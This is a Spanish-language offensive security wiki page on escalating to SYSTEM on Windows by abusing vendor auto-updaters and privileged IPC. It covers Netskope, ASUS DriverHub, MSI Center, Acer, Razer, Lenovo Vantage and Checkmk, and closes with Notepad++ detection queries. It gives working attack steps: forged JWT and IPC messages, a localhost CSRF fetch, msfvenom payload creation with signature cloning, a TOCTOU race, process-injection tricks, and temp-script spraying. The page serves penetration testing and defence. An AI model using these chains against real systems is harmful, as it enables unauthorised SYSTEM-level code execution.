# Abusando de Auto-Updaters empresariales e IPC privilegiado (p. ej., Netskope, ASUS y MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada de privilegios local en Windows encontradas en agentes de endpoint empresariales y updaters que exponen una superficie IPC de baja fricción y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client para Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el enrollment en un servidor controlado por el atacante y después entregar un MSI malicioso que el servicio SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC localhost de un servicio privilegiado para forzar el re-enrollment o la reconfiguración hacia un servidor controlado por el atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA fraudulenta y apuntar el updater a un paquete malicioso “firmado”.
- Evadir comprobaciones débiles del firmante (listas permitidas de CN), flags de digest opcionales y propiedades laxas de MSI.
- Si el IPC está “cifrado”, derivar la clave/IV a partir de identificadores de máquina legibles por todos almacenados en el registro.
- Si el servicio restringe los callers por la ruta de la imagen o el nombre del proceso, inyectar código en un proceso incluido en la lista permitida o iniciar uno suspendido y cargar la DLL mediante un parche mínimo del contexto del thread.

---
## 1) Forzar el enrollment en un servidor controlado por el atacante mediante IPC localhost

Muchos agentes incluyen un proceso de UI en user-mode que se comunica con un servicio SYSTEM mediante TCP localhost usando JSON.

Observado en Netskope:
- UI: stAgentUI (baja integridad) ↔ Servicio: stAgentSvc (SYSTEM)
- ID de comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo de explotación:
1) Crear un token de enrollment JWT cuyos claims controlen el host del backend (p. ej., AddonUrl). Usar alg=None para que no sea necesaria ninguna firma.
2) Enviar el mensaje IPC que invoque el comando de provisioning con tu JWT y el nombre del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio empieza a conectarse a tu servidor rogue para el enrollment/config, por ejemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del caller se basa en la ruta o el nombre, origina la solicitud desde un binario del vendor incluido en la allow-list (consulta §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking del canal de actualización para ejecutar código como SYSTEM

Una vez que el cliente se comunica con tu servidor, implementa los endpoints esperados y dirígelo hacia un MSI del atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo del updater muy corto, por ejemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA en formato PEM. El servicio lo instala en el almacén Trusted Root de Local Machine.
3) /v2/checkupdate → Proporciona metadatos que apuntan a un MSI malicioso y a una versión falsa.

Bypassing de comprobaciones comunes observadas en la práctica:
- Allow-list de Signer CN: el servicio puede comprobar únicamente que el Subject CN sea igual a “netSkope Inc” o “Netskope, Inc.”. Tu CA rogue puede emitir un leaf con ese CN y firmar el MSI.
- Propiedad CERT_DIGEST: incluye una propiedad benigna de MSI llamada CERT_DIGEST. No se aplica ninguna validación durante la instalación.
- Aplicación opcional del digest: un flag de configuración (por ejemplo, check_msi_digest=false) desactiva la validación criptográfica adicional.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lección sobre el bypass de parches: si un proveedor responde permitiendo una pequeña lista de dominios “trusted” en lugar de autenticar criptográficamente el origen de la actualización, busca redirectors o reverse proxies propiedad del proveedor que aún permitan dirigir el tráfico. En el caso de Netskope, investigaciones públicas posteriores demostraron que una allow-list de la era R129 todavía podía abusarse mediante `rproxy.goskope.com`, que hacía proxy del contenido controlado por el atacante en Azure App Service. Trata las allow-lists de hostnames como un obstáculo menor, no como un trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Forging de requests IPC cifradas (cuando están presentes)

A partir de R127, Netskope envolvió el JSON de IPC en un campo encryptData que parece Base64. El reversing mostró AES con una key/IV derivados de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un usuario estándar.<sup>[[1]](#references)[[2]](#references)</sup> Consejo general: si un agente de repente “cifra” su IPC, busca device IDs, product GUIDs e install IDs bajo HKLM como material.

---
## 4) Bypassing de allow-lists de callers de IPC (comprobaciones de path/name)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando el path/name de la imagen con binarios del proveedor incluidos en una allow-list y ubicados bajo Program Files (por ejemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dos bypasses prácticos:
- DLL injection en un proceso incluido en la allow-list (por ejemplo, nsdiag.exe) y proxy de IPC desde su interior.
- Iniciar un binario incluido en la allow-list en estado suspendido y cargar tu proxy DLL sin CreateRemoteThread (consulta §5) para satisfacer las reglas anti-tampering aplicadas por el driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Inyección compatible con la protección anti-tampering: proceso suspendido + patch de NtContinue

Los productos suelen incluir un driver minifilter/OB callbacks (por ejemplo, Stadrv) para eliminar derechos peligrosos de los handles hacia procesos protegidos:
- Proceso: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode fiable que respeta estas restricciones:
1) CreateProcess de un binario del proveedor con CREATE_SUSPENDED.
2) Obtén los handles que aún tienes permitidos: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sobre el proceso y un thread handle con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o simplemente THREAD_RESUME si aplicas el patch de código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk temprano y con mapeo garantizado) con un stub pequeño que llame a LoadLibraryW usando el path de tu DLL y después vuelva mediante un jump.
4) ResumeThread para activar tu stub dentro del proceso y cargar tu DLL.

Como nunca utilizaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME sobre un proceso ya protegido (tú lo creaste), se cumple la policy del driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Tooling práctico
- NachoVPN (plugin de Netskope) automatiza una CA rogue, la firma de un MSI malicioso y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope es un cliente IPC custom que construye mensajes IPC arbitrarios (opcionalmente cifrados con AES) e incluye la inyección en procesos suspendidos para originar la comunicación desde un binario incluido en la allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow rápido de triage para superficies desconocidas de updater/IPC

Al enfrentarte a un nuevo endpoint agent o a una suite de “helper” para la motherboard, normalmente basta con un workflow rápido para determinar si estás ante un objetivo prometedor de privesc:<sup>[[6]](#references)</sup>

1) Enumera los listeners de loopback y relaciónalos con los procesos del proveedor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerar named pipes candidatas:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Recopilar datos de enrutamiento almacenados en el registro utilizados por servidores IPC basados en plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrae primero los nombres de los endpoints, las claves JSON y los ID de comandos del cliente en user-mode. Los frontends empaquetados de Electron/.NET suelen hacer leak del esquema completo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Busca el predicado de confianza real, no solo la ruta de código que finalmente inicia el proceso:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrones que conviene priorizar:
- `CryptQueryObject`/análisis de certificados sin `WinVerifyTrust` normalmente significa que se trató “existe un certificado” como “el certificado es confiable”, lo que permite la clonación de certificados u otras técnicas de firmante falso.
- Las comprobaciones de subcadenas/sufijos sobre `Origin`, `Referer`, URLs de descarga, nombres de procesos o CN de firmantes no son autenticación. `contains(".vendor.com")` normalmente es explotable mediante dominios parecidos controlados por el atacante.
- Si la GUI con pocos privilegios decide que “el archivo es confiable” y el broker SYSTEM simplemente consume ese resultado, parchear o reimplementar la DLL/JS del lado del cliente suele evadir por completo el límite (validación dividida al estilo Razer).
- Si el broker copia un payload a `%TEMP%`/`C:\Windows\Temp` y luego lo valida o programa desde esa ruta, prueba inmediatamente las ventanas de reemplazo TOCTOU y los módulos de plugins hermanos que expongan wrappers alternativos de `ExecuteTask()` con comprobaciones más débiles.<sup>[[6]](#references)</sup>

Para objetivos con un uso intensivo de named pipes, PipeViewer permite detectar rápidamente DACLs débiles y pipes accesibles remotamente antes de empezar a hacer reversing del protocolo en profundidad.<sup>[[11]](#references)</sup>

Si el objetivo autentica a los callers únicamente mediante PID, ruta de la imagen o nombre del proceso, considéralo un obstáculo menor y no un límite: inyectarse en el cliente legítimo o realizar la conexión desde un proceso incluido en la lista permitida suele ser suficiente para satisfacer las comprobaciones del servidor. Específicamente para named pipes, [esta página sobre client impersonation y pipe abuse](named-pipe-client-impersonation.md) cubre la primitiva con más detalle.

---
## 8) Brokers de add-ins modulares autenticados únicamente mediante firmas del vendor (patrón Lenovo Vantage)

Una variación más reciente que conviene buscar es el **broker RPC de cliente firmado**: un proceso de escritorio Lenovo firmado y con pocos privilegios se comunica con un servicio SYSTEM, y el servicio dirige comandos JSON a un conjunto de add-ins descritos mediante XML en `%ProgramData%`. Una vez conseguida la ejecución de código **dentro de cualquier cliente firmado aceptado**, cada contrato `runas="system"` pasa a formar parte de tu attack surface.<sup>[[15]](#references)</sup>

Primitivas de alto valor observadas en la investigación de Lenovo Vantage:
- **Confiar en el caller porque está firmado por el vendor**: los investigadores alcanzaron un contexto autenticado copiando un EXE firmado por Lenovo a un directorio escribible y satisfaciendo un DLL side-load (`profapi.dll`), de modo que se ejecutara código arbitrario dentro de un cliente en el que el servicio ya confiaba.
- **Descubrimiento de la attack surface basado en manifests**: los add-ins se declaran en `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; varios contratos se ejecutan como `SYSTEM`, por lo que enumerar esos manifests suele revelar los verbos privilegiados reales más rápido que hacer reversing del propio broker.
- **Bugs por comando detrás del canal autenticado**: una vez dentro del cliente confiable, la investigación pública encontró path traversal + race conditions en verbos de actualización/instalación, abuso de raw SQL en bases de datos privilegiadas de configuración y comprobaciones de rutas del registro basadas en subcadenas que permitían escribir fuera de la hive prevista.

Recon útil en un objetivo:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Conclusión práctica: siempre que una helper suite exponga un broker que primero autentique el **caller process** y solo después distribuya las llamadas entre docenas de comandos de plugins/add-ins, no te detengas después de evadir la comprobación de confianza de la puerta de entrada. Extrae la tabla de manifest/contract y fuzz cada verbo de alto privilegio de forma independiente; el canal autenticado normalmente oculta varios bugs de segunda etapa.

---
## 1) CSRF de Browser a localhost contra APIs HTTP privilegiadas (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del navegador procedentes de https://driverhub.asus.com. El filtro de origin simplemente ejecuta `string_contains(".asus.com")` sobre el header Origin y sobre las URLs de descarga expuestas por `/asus/v1.0/*`. Por tanto, cualquier host controlado por un atacante, como `https://driverhub.asus.com.attacker.tld`, supera la comprobación y puede emitir requests que cambian el estado desde JavaScript.<sup>[[6]](#references)</sup> Consulta [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para conocer patrones de bypass adicionales.

Flujo práctico:
1) Registra un dominio que contenga `.asus.com` y aloja allí una página web maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (por ejemplo, `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el cuerpo JSON esperado por el handler; el frontend JS packed muestra el siguiente schema.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Incluso la CLI de PowerShell mostrada a continuación funciona correctamente cuando el header Origin se falsifica con el valor de confianza:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Por lo tanto, cualquier visita del navegador al sitio del atacante se convierte en un CSRF local de 1 clic (o de 0 clic mediante `onload`) que controla un helper con privilegios SYSTEM.

---
## 2) Verificación insegura de code-signing y clonación de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los almacena en caché en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica de substring, por lo que `http://updates.asus.com.attacker.tld:8000/payload.exe` es aceptada. Después de la descarga, ADU.exe solo comprueba que el PE contenga una firma y que la cadena Subject coincida con ASUS antes de ejecutarlo: no usa `WinVerifyTrust` ni valida la cadena de certificados.

Para weaponize el flujo:
1) Crear un payload (por ejemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonar el signer de ASUS en él (por ejemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Alojar `pwn.exe` en un dominio lookalike de `.asus.com` y activar UpdateApp mediante el CSRF del navegador anterior.

Como los filtros de Origin y URL se basan en substring y la comprobación del signer solo compara strings, DriverHub descarga y ejecuta el binario del atacante bajo su contexto elevado.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU dentro de las rutas de copia/ejecución del updater (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP en el que cada frame tiene el formato `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su handler:
1) Copia el ejecutable proporcionado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma mediante `CS_CommonAPI.EX_CA::Verify` (el subject del certificado debe ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una scheduled task que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no se bloquea entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar el Frame A apuntando a un binario legítimo firmado por MSI (garantiza que la comprobación de la firma pase y que la task se ponga en cola).
- Competir con él enviando repetidos mensajes Frame B que apunten a un payload malicioso y sobrescriban `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando el scheduler se activa, ejecuta el payload sobrescrito bajo SYSTEM aunque se haya validado el archivo original. La explotación fiable utiliza dos goroutines/threads que envían repetidamente `CMD_AutoUpdateSDK` hasta ganar la ventana TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso de IPC personalizado a nivel SYSTEM e impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP de MSI Center
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado en `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de un frame seleccionan ese componente, lo que permite a los atacantes dirigir comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios task runners. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` **sin validación de firma**; cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución SYSTEM de forma determinista.
- Capturar el loopback con Wireshark o instrumentar los binarios .NET en dnSpy revela rápidamente el mapeo Component ↔ command; después, clients personalizados en Go/Python pueden reproducir los frames.<sup>[[6]](#references)</sup>

### Named pipes de Acer Control Centre y niveles de impersonation
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clients remotos (por ejemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el command ID `7` con una ruta de archivo invoca la rutina de spawning de procesos del servicio.
- La client library serializa un byte terminador mágico (113) junto con los argumentos. La instrumentación dinámica con Frida/`TsDotNetLib` (consulta [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para obtener consejos de instrumentación) muestra que el handler nativo asigna este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un SID de integridad antes de llamar a `CreateProcessAsUser`.
- Cambiar 113 (`0x71`) por 114 (`0x72`) entra en la branch genérica, que conserva el token SYSTEM completo y establece un SID de alta integridad (`S-1-16-12288`). Por lo tanto, el binario ejecutado se inicia como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combinar esto con el installer flag expuesto (`Setup.exe -nocheck`) permite poner en marcha ACC incluso en lab VMs y probar el pipe sin hardware del vendor.<sup>[[6]](#references)</sup>

Estos bugs de IPC destacan por qué los servicios de localhost deben aplicar autenticación mutua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) y por qué cada helper de los módulos para “ejecutar un binario arbitrario” debe compartir las mismas verificaciones del signer.

---
## 3) Helpers “elevator” de COM/IPC respaldados por una validación débil en user-mode (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un usuario con pocos privilegios puede solicitar a un helper de COM que lance un proceso mediante `RzUtility.Elevator`, mientras que la decisión de confianza se delega en una DLL de user-mode (`simple_service.dll`) en lugar de aplicarse de forma robusta dentro del límite privilegiado.

Ruta de explotación observada:
- Instanciar el objeto COM `RzUtility.Elevator`.
- Llamar a `LaunchProcessNoWait(<path>, "", 1)` para solicitar un lanzamiento elevado.
- En el PoC público, el gate de PE-signature dentro de `simple_service.dll` se parchea antes de emitir la solicitud, lo que permite lanzar un ejecutable arbitrario elegido por el atacante.<sup>[[6]](#references)</sup>

Invocación mínima de PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Idea general: al hacer reversing de suites “helper”, no te limites a TCP en localhost o named pipes. Busca clases COM con nombres como `Elevator`, `Launcher`, `Updater` o `Utility`, y verifica si el servicio privilegiado valida realmente el binario objetivo o si simplemente confía en un resultado calculado por una DLL cliente en user-mode que puede ser modificada. Este patrón se generaliza más allá de Razer: cualquier diseño dividido en el que el broker con altos privilegios consuma una decisión de allow/deny procedente del lado con bajos privilegios puede ser una superficie de privesc.


---
## Ejecución predecible de scripts temporales durante la reparación de MSI (Checkmk Agent / CVE-2024-0670)

Algunos agentes de Windows todavía implementan acciones privilegiadas escribiendo un `.cmd` temporal en `C:\Windows\Temp` y ejecutándolo como `SYSTEM`. Si el nombre de archivo es predecible y el servicio no recrea de forma segura los archivos existentes, un usuario con pocos privilegios puede crear previamente el futuro archivo temporal como **de solo lectura** y hacer que el proceso privilegiado ejecute contenido controlado por el atacante en lugar de su propio script.

Observado en builds vulnerables de Checkmk Agent:
- patrón temporal: `cmk_all_<PID>_1.cmd`
- ramas afectadas: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **repair** de MSI del paquete del agente almacenado en caché<sup>[[8]](#references)[[9]](#references)</sup>

Flujo de trabajo práctico:
1. Estima un rango de PID realista a partir de los ID de proceso actuales o del PID del agente en ejecución.
2. Escribe un payload `.cmd` corto en **ASCII** (`Set-Content -Encoding Ascii` o redirección de `cmd.exe`; evita la salida de PowerShell en UTF-16 para archivos batch).
3. Distribuye `C:\Windows\Temp\cmk_all_<PID>_1.cmd` por todo el rango candidato y marca cada archivo como de solo lectura.
4. Activa un repair del MSI almacenado en caché para que el servicio privilegiado intente regenerar y luego ejecute el script temporal.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Si el producto vulnerable está instalado con Windows Installer, relaciona el MSI en caché de aspecto aleatorio ubicado en `C:\Windows\Installer` con su nombre de producto antes de activar la reparación:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Notas operativas:
- `qwinsta` es útil cuando `msiexec /fa` falla desde un shell de WinRM no interactivo y necesitas determinar si una sesión de escritorio existente o desconectada puede activar correctamente la reparación.<sup>[[7]](#references)</sup>
- Este patrón se generaliza a otros agentes de endpoint y updaters que **preparan scripts temporales en ubicaciones con permisos de escritura para todos y posteriormente los ejecutan como SYSTEM**. Comprueba si existen nombres predecibles, ausencia de semántica de creación exclusiva y flujos de reparación/actualización que puedan activarse bajo demanda.

---
## Secuestro remoto de la cadena de suministro mediante validación débil del updater (WinGUp / Notepad++)

Entre junio de 2025 y diciembre de 2025, atacantes que comprometieron la infraestructura de hosting detrás del flujo de actualización de Notepad++ sirvieron selectivamente manifests maliciosos a víctimas elegidas. Los updaters antiguos basados en WinGUp no verificaban completamente la autenticidad de las actualizaciones, por lo que una respuesta XML maliciosa podía redirigir a los clientes a URLs controladas por los atacantes. Debido a que el cliente aceptaba contenido HTTPS sin exigir simultáneamente una cadena de certificados de confianza y una firma PE válida en el instalador descargado, las víctimas descargaban y ejecutaban un `update.exe` de NSIS troyanizado.<sup>[[12]](#references)[[13]](#references)</sup>

Flujo operativo (no requiere exploit local):
1. **Interceptación de la infraestructura**: comprometer la CDN/hosting y responder a las comprobaciones de actualización con metadata del atacante que apunte a una URL de descarga maliciosa.
2. **NSIS troyanizado**: el instalador descarga/ejecuta un payload y abusa de dos cadenas de ejecución:
- **Bring-your-own signed binary + sideload**: incluir el `BluetoothService.exe` firmado de Bitdefender y colocar un `log.dll` malicioso en su ruta de búsqueda. Cuando se ejecuta el binario firmado, Windows carga mediante sideload `log.dll`, que descifra y carga reflectivamente el backdoor Chrysalis (protegido por Warbird + API hashing para dificultar la detección estática).
- **Inyección de shellcode mediante scripts**: NSIS ejecuta un script Lua compilado que utiliza APIs de Win32 (por ejemplo, `EnumWindowStationsW`) para inyectar shellcode y preparar Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Conclusiones de hardening/detección para cualquier auto-updater:
- Exige la **verificación del certificado + firma** del instalador descargado (fija el signer del proveedor y rechaza un CN/cadena que no coincida) y firma el manifest de actualización (por ejemplo, XMLDSig). Bloquea las redirecciones controladas por el manifest salvo que estén validadas.
- Trata el **sideloading de binarios firmados BYO** como un punto de pivote de detección posterior a la descarga: genera alertas cuando un EXE firmado de un proveedor carga un nombre de DLL desde fuera de su ruta de instalación canónica (por ejemplo, Bitdefender cargando `log.dll` desde Temp/Downloads) y cuando un updater deposita/ejecuta instaladores desde ubicaciones temporales con firmas que no pertenecen al proveedor.
- Supervisa los **artefactos específicos del malware** observados en esta cadena (útiles como pivotes genéricos): el mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` en `%TEMP%` y las fases de inyección de shellcode dirigidas mediante Lua.
- Notepad++ respondió reforzando WinGUp en v8.8.9 y versiones posteriores: el XML devuelto ahora está firmado (XMLDSig), y las compilaciones más recientes exigen la verificación del certificado + firma del instalador descargado en lugar de confiar únicamente en el transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading de EXE firmado por Bitdefender mediante <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ejecutando un instalador que no pertenece a Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Estos patrones se generalizan a cualquier updater que acepte manifests sin firma o no fije los signers del instalador: hijacking de red + instalador malicioso + sideloading firmado con BYO permiten remote code execution bajo la apariencia de actualizaciones “trusted”.

---
## Referencias
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
